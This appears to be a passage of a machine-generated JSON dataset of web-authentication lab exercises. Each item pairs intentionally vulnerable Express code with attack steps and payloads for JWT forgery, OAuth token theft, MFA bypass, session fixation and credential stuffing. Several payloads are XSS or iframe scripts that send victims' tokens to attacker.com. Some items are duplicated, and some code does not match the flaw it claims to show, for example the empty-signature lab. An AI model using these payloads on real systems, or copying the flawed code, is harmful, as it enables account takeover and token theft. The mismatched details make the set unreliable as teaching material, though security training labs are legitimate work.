    "payloads": [
      "POST /mfa/verify HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 15\r\n\r\n{\"code\":\"123456\"}",
      "POST /mfa/verify HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 15\r\n\r\n{\"code\":\"111111\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via JSONP authentication endpoint",
    "Lab Description": "The legacy JSONP authentication endpoint lacks rate limiting and proper CORS headers. The application [exposes user enumeration through subtle response differences]. To solve: Perform credential stuffing attack via JSONP callbacks to bypass same-origin policy.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify JSONP authentication endpoint using OWASP ZAP",
      "Craft malicious HTML page with credential payloads",
      "Analyze callback responses for successful authentications",
      "Automate attack with custom script cycling through credentials",
      "Hijack valid session from successful callback"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/auth/jsonp', (req, res) => {const {user, pass, callback} = req.query;const valid = db.checkCredentials(user, pass);res.send(`${callback}(${JSON.stringify({valid})})`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<script src=\"https://victim.com/auth/jsonp?user=admin&pass=password&callback=steal\"></script>",
      "<script>function steal(data){if(data.valid) document.location='http://attacker.com/?creds=valid';}</script>"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT validation improperly trusts the jku header to fetch verification keys from external sources. The application [fails to validate jku domains]. To solve: Forge admin token by hosting malicious JWKS file and injecting your jku header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and decode structure",
      "Set up attacker-controlled server hosting crafted JWKS file",
      "Modify jku header to point to malicious JWKS endpoint",
      "Sign new token with attacker's private key",
      "Submit forged token to admin API endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const axios = require('axios');const app = express();app.get('/admin', async (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.decode(token, {complete: true});const jwks = await axios.get(decoded.header.jku);const key = jwks.data.keys[0];jwt.verify(token, key);res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2p3a3MifQ.eyJ1c2VyIjoiYWRtaW4ifQ.EPV9...",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vbWFsY2RuLmNvbS9tYWxpY2lvdXMuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.KJB2..."
    ]
  },
  {
    "Lab scenario": "Session fixation via XSS in OAuth redirect_uri parameter",
    "Lab Description": "The OAuth implementation allows arbitrary redirect_uri values and reflects session tokens in URL fragments. The application [stores session tokens client-side]. To solve: Chain XSS in redirect_uri with session fixation to hijack user sessions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth flow using OWASP ZAP",
      "Craft malicious redirect_uri with XSS payload",
      "Trigger victim to initiate OAuth flow",
      "Capture session token from reflected fragment",
      "Fixate session using stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/auth', (req, res) => {const {redirect_uri} = req.query;const token = generateToken();res.redirect(`${redirect_uri}#token=${token}`);});app.get('/profile', (req, res) => {const token = req.query.token || req.cookies.session;if(validateToken(token)) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=https://attacker.com/xss.html%23",
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=data:text/html,<script>document.location='http://attacker.com/?token='+document.location.hash.substring(7)</script>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP method tampering on verification endpoint",
    "Lab Description": "The MFA verification endpoint fails to enforce proper HTTP method validation. The application [processes GET and POST identically]. To solve: Bypass MFA by converting POST verification to GET request with parameters in query string.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA verification POST request with Burp Suite",
      "Change method from POST to GET",
      "Move parameters from body to query string",
      "Resend request without valid MFA code",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());app.all('/mfa/verify', (req, res) => {const code = req.body.code || req.query.code;if(code === '123456') res.send('Verified');else res.status(403).send('Invalid');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "GET /mfa/verify?code=123456 HTTP/1.1",
      "GET /mfa/verify?code= HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-sensitive password comparison",
    "Lab Description": "The authentication endpoint performs case-sensitive password comparison against lowercase stored values. The application [stores passwords in lowercase]. To solve: Perform credential stuffing attack using lowercase variants of known password leaks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify authentication endpoint using OWASP ZAP",
      "Load known credential lists into Burp Intruder",
      "Configure payload processing to lowercase all passwords",
      "Execute attack with processed payloads",
      "Identify successful authentications"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{user:'admin',pass:'secret123'}];app.post('/login', (req, res) => {const {user, pass} = req.body;const account = users.find(u => u.user === user);if(account && account.pass === pass.toLowerCase()) res.send('Logged in');else res.status(401).send('Failed');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"user\":\"admin\",\"pass\":\"SECRET123\"}",
      "{\"user\":\"admin\",\"pass\":\"SeCrEt123\"}"
    ]
  },
  {
    "Lab scenario": "Session hijacking via GraphQL batch query IDOR",
    "Lab Description": "The GraphQL endpoint processes batch queries with shared authentication context. The application [reuses session for all queries in batch]. To solve: Inject unauthorized queries alongside legitimate ones in batch request to access other users' data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify GraphQL batch endpoint using Postman",
      "Capture legitimate authenticated query",
      "Construct batch request mixing authorized and unauthorized queries",
      "Embed session hijacking query targeting admin data",
      "Extract sensitive data from batch response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const {graphqlHTTP} = require('express-graphql');const app = express();app.use('/graphql', graphqlHTTP({schema: schema,batch: true}));app.listen(3000);",
    "payloads": [
      "[{\"query\":\"query { myProfile { email }}\"},{\"query\":\"query { user(id:1) { privateData }}\"}]",
      "[{\"query\":\"mutation { changePassword(new:\\\"hacked\\\")}\"},{\"query\":\"query { allUsers { apiKeys }}\"}]"
    ]
  },
  {
    "Lab scenario": "JWT brute-force via weak HS256 secret in debug endpoint",
    "Lab Description": "The debug endpoint leaks JWT verification secrets through verbose error messages. The application [exposes secret in HMAC-SHA256 validation failures]. To solve: Extract weak secret from error response and forge admin token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send malformed JWT to debug endpoint using Burp Suite",
      "Extract secret key from verbose error message",
      "Use cracked secret to sign new admin token",
      "Bypast rate limiting by varying JWT claims",
      "Access admin dashboard with forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/debug', (req, res) => {try {jwt.verify(req.body.token, 'secret123', {algorithms:['HS256']});res.send('Valid');} catch(e) {res.send(`Error: ${e.message} using secret secret123`);}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.InvalidToken\"}",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.7J2Q..."
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via asymmetric to symmetric substitution",
    "Lab Description": "The JWT implementation accepts both asymmetric and symmetric algorithms but fails to validate the signing method consistently. The application [treats RS256 as HS256 when key is embedded]. To solve: Convert public key to symmetric secret and forge valid tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Extract public key from application's /.well-known/jwks.json endpoint",
      "Convert RSA public key to PEM format using Burp Suite",
      "Modify JWT header to use HS256 algorithm instead of RS256",
      "Sign new token using public key as symmetric secret",
      "Submit forged token to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();const publicKey = fs.readFileSync('./public.pem');app.post('/verify', (req, res) => {try {jwt.verify(req.body.token, publicKey, {algorithms: ['RS256','HS256']});res.send('Valid');} catch(e) {res.status(403).send('Invalid');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe CSP bypass",
    "Lab Description": "The OAuth token endpoint is embedded in iframes with overly permissive CSP headers. The application [leaks tokens through postMessage events]. To solve: Craft malicious page that extracts tokens via iframe CSP bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Analyze CSP headers for unsafe-eval or unsafe-inline directives",
      "Create malicious page embedding target iframe",
      "Inject JavaScript to intercept postMessage events",
      "Extract OAuth tokens from message data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.set('Content-Security-Policy', \"default-src 'self' 'unsafe-inline'\");res.send(`<script>parent.postMessage({token:'secret123'},'*')</script>`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth/iframe\" onload=\"window.addEventListener('message',e=>document.location='http://attacker.com/?token='+e.data.token)\"></iframe>",
      "<script>var iframe=document.createElement('iframe');iframe.src='https://victim.com/oauth/iframe';document.body.appendChild(iframe);window.addEventListener('message',e=>fetch('http://attacker.com',{method:'POST',body:e.data.token}));</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake parameter injection",
    "Lab Description": "The WebSocket connection assigns session tokens based on unvalidated handshake parameters. The application [trusts ws:// URL parameters for session binding]. To solve: Inject session token through crafted WebSocket URL and force victim to authenticate.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket connection using Burp Suite",
      "Modify handshake request to include session parameter",
      "Create malicious page initiating WebSocket connection",
      "Trigger victim to authenticate during active WebSocket session",
      "Take over authenticated session using fixated token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({server: app.listen(3000)});wss.on('connection', (ws, req) => {const session = new URL(req.url,'ws://localhost').searchParams.get('session');ws.session = session || uuidv4();});",
    "payloads": [
      "ws://victim.com/chat?session=malicious123",
      "new WebSocket('ws://victim.com/chat?session=fixed_session_id')"
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-based one-time password prediction",
    "Lab Description": "The TOTP implementation uses insufficient entropy in seed generation. The application [generates predictable MFA seeds based on username]. To solve: Calculate valid TOTP codes by reverse-engineering the seed generation algorithm.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enroll multiple test accounts and collect their TOTP seeds",
      "Analyze seed patterns using Python scripts",
      "Reverse-engineer seed generation formula",
      "Calculate victim's likely seed based on username",
      "Generate valid TOTP codes using predicted seed"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const speakeasy = require('speakeasy');const app = express();app.post('/mfa/enroll', (req, res) => {const seed = Buffer.from(req.body.username).toString('hex').slice(0,10);const otp = speakeasy.generateSecret({seed});res.json(otp);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"username\":\"carlos\",\"code\":\"123456\"}",
      "{\"username\":\"admin\",\"code\":\"654321\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-insensitive username matching",
    "Lab Description": "The authentication endpoint performs case-insensitive username comparison but case-sensitive password checks. The application [stores usernames in lowercase but preserves case in passwords]. To solve: Perform credential stuffing with case-varied usernames against known password lists.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify authentication endpoint using OWASP ZAP",
      "Load known username lists into Burp Intruder",
      "Configure payload processing to lowercase usernames",
      "Execute attack with case-varied username payloads",
      "Identify successful authentications through response differences"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{user:'admin',pass:'Secret123!'}];app.post('/login', (req, res) => {const {user, pass} = req.body;const account = users.find(u => u.user === user.toLowerCase());if(account && account.pass === pass) res.send('Logged in');else res.status(401).send('Failed');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"user\":\"Admin\",\"pass\":\"Secret123!\"}",
      "{\"user\":\"ADMIN\",\"pass\":\"Secret123!\"}"
    ]
  },
  {
    "Lab scenario": "JWT key injection via jwk header parameter",
    "Lab Description": "The JWT validation improperly processes embedded jwk headers in tokens. The application [trusts self-signed keys without verification]. To solve: Inject malicious RSA public key in jwk header and sign token with corresponding private key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and decode structure",
      "Generate new RSA key pair using OpenSSL",
      "Craft jwk header with attacker's public key",
      "Sign new token with attacker's private key",
      "Submit forged token to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/admin', (req, res) => {try {const decoded = jwt.verify(req.body.token, (header, payload, done) => {const key = header.jwk ? jwkToPem(header.jwk) : publicKey;done(null, key);});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMHhBZGluIiwiZSI6IkFRQUIifX0.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMHhNYWxpY2lvdXMiLCJlIjoiQVFBQiJ9fQ.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via open redirect",
    "Lab Description": "The OAuth implementation allows arbitrary redirect_uri values through an open redirect vulnerability. The application [leaks tokens in URL fragments]. To solve: Chain open redirect with token leakage to steal authentication tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth flow using OWASP ZAP",
      "Find open redirect endpoint in application",
      "Craft malicious redirect_uri pointing to open redirect",
      "Trigger authentication flow and capture token",
      "Use stolen token to access victim's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = generateToken();res.redirect(`${req.query.redirect_uri}#token=${token}`);});app.get('/redirect', (req, res) => {res.redirect(req.query.url);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=https://victim.com/redirect?url=https://attacker.com",
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=https://victim.com/redirect?url=data:text/html,<script>document.location='http://attacker.com/?token='+document.location.hash.substring(7)</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket subscriptions",
    "Lab Description": "The GraphQL subscription endpoint assigns session tokens over websockets before authentication. The application [reuses connection IDs as session tokens]. To solve: Establish websocket connection, fixate session ID, and force victim to authenticate over same connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish GraphQL websocket connection using Postman",
      "Note connection ID in initial handshake response",
      "Create malicious page that forces victim to authenticate over your connection",
      "Monitor subscription channel for victim's data",
      "Use captured session token in regular HTTP requests"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer} = require('http');const {SubscriptionServer} = require('subscriptions-transport-ws');const server = createServer();SubscriptionServer.create({onConnect: (connParams, socket) => {socket.id = uuidv4();}}, {server, path: '/graphql'});server.listen(3000);",
    "payloads": [
      "{\"type\":\"connection_init\",\"payload\":{\"sessionId\":\"FIXATED_ID\"}}",
      "{\"query\":\"subscription {userAuth {token}}\",\"variables\":{}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via status code manipulation",
    "Lab Description": "The MFA verification endpoint relies on client-side status code interpretation. The application [processes failed verifications as successes]. To solve: Intercept and modify status code from 403 to 200 to bypass MFA.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA verification request with Burp Suite",
      "Submit invalid verification code",
      "Modify response status code from 403 to 200",
      "Forward modified response to client",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/mfa/verify', (req, res) => {if(req.body.code === '123456') res.status(200).send('Verified');else res.status(403).send('Invalid code');});app.get('/dashboard', (req, res) => {if(req.session.verified) res.send('Admin dashboard');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "POST /mfa/verify HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 15\r\n\r\n{\"code\":\"111111\"}",
      "HTTP/1.1 200 OK\r\nContent-Length: 8\r\n\r\nVerified"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via password reset timing attack",
    "Lab Description": "The password reset endpoint leaks account existence through response timing. The application [takes longer to respond for valid accounts]. To solve: Perform timing attack to enumerate valid accounts then credential stuff with known passwords.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify password reset endpoint using OWASP ZAP",
      "Measure response times for known valid/invalid accounts",
      "Automate timing attack with Burp Intruder",
      "Identify accounts with statistically significant longer responses",
      "Perform credential stuffing against enumerated accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{email:'admin@victim.com'}];app.post('/reset-password', (req, res) => {const user = users.find(u => u.email === req.body.email);if(user) {expensiveHash(req.body.email);res.send('If account exists, email sent');} else {res.send('If account exists, email sent');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"email\":\"admin@victim.com\"}",
      "{\"email\":\"unknown@test.com\"}"
    ]
  },
  {
    "Lab scenario": "Session hijacking via JWT cross-service replay",
    "Lab Description": "The same JWT secret is used across multiple microservices. The application [shares verification keys between services]. To solve: Capture low-privilege token from one service and replay it to privileged endpoints in another service.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Obtain valid JWT from user-facing service using Burp Suite",
      "Identify administrative API endpoints through documentation",
      "Replay captured token to administrative endpoints",
      "Escalate privileges by modifying token claims",
      "Access restricted functionality across services"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();const secret = 'shared-secret-123';app.post('/admin/api', (req, res) => {try {const decoded = jwt.verify(req.headers.authorization, secret);res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via empty signature",
    "Lab Description": "The JWT validation fails when encountering tokens with empty signatures. The application [incorrectly processes unsigned tokens as valid]. To solve: Remove the signature portion from a valid JWT while keeping the header and payload intact to bypass authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT token using Burp Suite",
      "Decode the token structure using jwt.io",
      "Remove the signature portion completely",
      "Submit the modified token ending with a dot",
      "Access privileged endpoints with the unsigned token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, 'secret', {algorithms:['HS256']});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS",
    "Lab Description": "The OAuth token endpoint has overly permissive CORS headers. The application [exposes tokens to arbitrary origins]. To solve: Craft malicious JavaScript to retrieve tokens cross-origin and exfiltrate them to an attacker-controlled server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth token endpoint using OWASP ZAP",
      "Analyze CORS headers for Access-Control-Allow-Origin values",
      "Create malicious page with XMLHttpRequest to token endpoint",
      "Configure server to receive exfiltrated tokens",
      "Trigger victim to visit malicious page"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use((req, res, next) => {res.set('Access-Control-Allow-Origin', '*');next();});app.post('/oauth/token', (req, res) => {res.json({access_token: 'secret123'});});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<script>fetch('https://victim.com/oauth/token').then(r=>r.json()).then(d=>fetch('https://attacker.com/?token='+d.access_token))</script>",
      "var xhr=new XMLHttpRequest();xhr.open('POST','https://victim.com/oauth/token');xhr.onload=function(){document.location='https://attacker.com/?token='+JSON.parse(this.responseText).access_token};xhr.send();"
    ]
  },
  {
    "Lab scenario": "Session fixation via JSON Web Encryption",
    "Lab Description": "The application uses JWE tokens for session management but fails to validate key ownership. The application [accepts encrypted tokens with attacker-controlled keys]. To solve: Generate new encryption key pair, create JWE token with victim's session data, and fixate session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze JWE token structure using Burp Suite",
      "Generate new RSA key pair using OpenSSL",
      "Encrypt valid session payload with attacker's public key",
      "Inject crafted JWE token via cookie manipulation",
      "Force victim to use the fixated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jose = require('node-jose');const app = express();app.get('/profile', async (req, res) => {try {const keystore = jose.JWK.createKeyStore();await keystore.add(req.cookies.key,'pem');const decrypted = await jose.JWE.createDecrypt(keystore).decrypt(req.cookies.session);res.send('User profile');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkEyNTZHQ00ifQ.eyJzZXNzaW9uIjoiMTIzIn0.KAQ...",
      "eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkEyNTZHQ00ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.LSI..."
    ]
  },
  {
    "Lab scenario": "MFA bypass via parallel session exploitation",
    "Lab Description": "The MFA verification doesn't invalidate existing sessions after completion. The application [allows multiple concurrent sessions]. To solve: Maintain authenticated session while completing MFA in different browser to bypass verification requirement.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Log in and obtain pre-MFA session cookie using Burp Suite",
      "Preserve this session in one browser instance",
      "Complete MFA verification in separate browser instance",
      "Reuse original session cookie to access protected resources",
      "Access privileged endpoints without completing MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};app.post('/login', (req, res) => {const session = uuidv4();sessions[session] = {user: req.body.user, mfaVerified: false};res.cookie('session', session);res.send('Complete MFA');});app.post('/verify-mfa', (req, res) => {sessions[req.cookies.session].mfaVerified = true;res.send('Verified');});app.get('/admin', (req, res) => {if(sessions[req.cookies.session].mfaVerified) res.send('Admin panel');else res.status(403).send('MFA required');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "Cookie: session=pre-mfa-session",
      "Cookie: session=verified-session"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via key confusion attack",
    "Lab Description": "The JWT implementation accepts both symmetric and asymmetric algorithms but fails to properly validate key types. The application [treats public keys as HMAC secrets]. To solve: Exploit algorithm confusion to forge valid tokens by signing with the public key as an HMAC secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Extract public key from application's /.well-known/jwks.json endpoint",
      "Convert public key to PEM format using OpenSSL",
      "Modify JWT header to use HS256 algorithm",
      "Sign token using public key as HMAC secret",
      "Submit forged token to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();const publicKey = fs.readFileSync('./public.pem');app.post('/admin', (req, res) => {try {jwt.verify(req.body.token, publicKey, {algorithms: ['RS256','HS256']});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via referer header leakage",
    "Lab Description": "The OAuth implementation leaks access tokens through referer headers when loading external resources. The application [includes tokens in GET parameters]. To solve: Craft malicious page that triggers resource loading to capture tokens through referer headers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token leakage in referer headers",
      "Create malicious page with embedded resources",
      "Trigger victim to visit page while authenticated",
      "Capture token from server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = req.query.access_token;res.send(`<img src=\"https://external.com/logo.png\">`);});app.get('/profile', (req, res) => {if(req.headers.authorization === `Bearer ${token}`) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<img src=\"http://attacker.com/collect?leak=\">",
      "<link rel=\"stylesheet\" href=\"http://attacker.com/steal.css\">"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 request smuggling",
    "Lab Description": "The application's HTTP/2 implementation improperly processes session cookies across multiplexed streams. The application [assigns sessions based on first request's headers]. To solve: Craft HTTP/2 requests to fixate session cookie across multiple connections.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify HTTP/2 support using Burp Suite",
      "Construct malicious HTTP/2 requests with conflicting headers",
      "Fixate session cookie in initial stream",
      "Force victim to authenticate over same connection",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({cert:fs.readFileSync('server.crt'),key:fs.readFileSync('server.key')});server.on('stream', (stream, headers) => {if(!headers['cookie']) headers['cookie'] = `session=${uuidv4()}`;stream.respond({'content-type':'text/html'});stream.end('Response');});server.listen(3000);",
    "payloads": [
      "GET / HTTP/2\r\nHost: victim.com\r\nCookie: session=malicious123\r\n\r\n",
      "POST /login HTTP/2\r\nHost: victim.com\r\nCookie: session=malicious123\r\n\r\nusername=admin&password=admin"
    ]
  },
  {
    "Lab scenario": "MFA bypass via response manipulation",
    "Lab Description": "The MFA verification relies on client-side validation of success responses. The application [processes all 200 responses as successful]. To solve: Intercept and modify failed verification responses to appear successful.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA verification request with Burp Suite",
      "Submit invalid verification code",
      "Modify response body from failure to success",
      "Forward modified response to client",
      "Observe authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/mfa/verify', (req, res) => {if(req.body.code === '123456') res.json({success:true});else res.json({success:false});});app.get('/dashboard', (req, res) => {if(req.session.verified) res.send('Admin dashboard');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"code\":\"111111\"}",
      "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"success\":true}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via password reset timing attack",
    "Lab Description": "The password reset endpoint leaks account existence through response timing. The application [takes longer to process valid accounts]. To solve: Perform timing attack to enumerate valid accounts then credential stuff with common passwords.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify password reset endpoint using OWASP ZAP",
      "Measure response times for known valid/invalid accounts",
      "Automate timing attack with Burp Intruder",
      "Identify accounts with statistically significant longer responses",
      "Perform credential stuffing against enumerated accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{email:'admin@victim.com'}];app.post('/reset-password', (req, res) => {const user = users.find(u => u.email === req.body.email);if(user) {expensiveHash(req.body.email);res.send('If account exists, email sent');} else {res.send('If account exists, email sent');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"email\":\"admin@victim.com\"}",
      "{\"email\":\"unknown@test.com\"}"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via null signature attack",
    "Lab Description": "The JWT validation fails to properly handle tokens with null bytes in the signature. The application [incorrectly validates truncated signatures]. To solve: Craft a token with null bytes in the signature to bypass validation while maintaining valid header and payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
